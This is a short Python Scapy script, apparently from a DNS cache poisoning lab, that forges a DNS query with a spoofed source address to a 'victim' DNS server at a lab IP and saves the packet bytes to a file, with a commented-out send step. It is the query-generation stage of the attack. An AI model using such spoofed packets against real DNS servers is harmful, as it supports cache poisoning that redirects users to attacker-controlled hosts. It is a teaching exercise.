#!/usr/bin/env python3

from scapy.all import *
from scapy.layers.dns import DNSQR, DNS
from scapy.layers.inet import IP, UDP

import random
import string

# def generate_random_subdomain(length=5):
#     letters = string.ascii_lowercase
#     return ''.join(random.choice(letters) for i in range(length))
# subdomain = generate_random_subdomain()S
# random_hostname =subdomain + '.example.com'

# Parameters
victim_dns_server = '10.9.0.53'        # IP of the DNS server
random_hostname = 'twysw.example.com'  # Random hostname for attack
src_port = 12345                       # Source port for UDP packet (5555)
dest_port = 53                         # DNS uses port 53

Qdsec = DNSQR(qname=random_hostname)                                         # Create DNS query
dns = DNS(id=0xAAAA,qr=0,qdcount=1,ancount=0,nscount=0,arcount=0,qd=Qdsec)   # Create DNS packet

# ip = IP(dst=victim_dns_server, src="10.9.0.1")                               # Attacker ip -> Victim's DNS server ip
ip  = IP(src ='1.2.3.4',dst=victim_dns_server  )
udp = UDP(dport=dest_port, sport=src_port,chksum=0)                                   # UDP header
request = ip / udp / dns                                                     # Full request packet

# print(request.summary()) #for debugging

# Save the DNS request to a file (ip_req.bin)
with open("ip_req.bin", "wb") as f:
    f.write(bytes(request))
    request.show()

# send the packet for immediate testing
# send(request)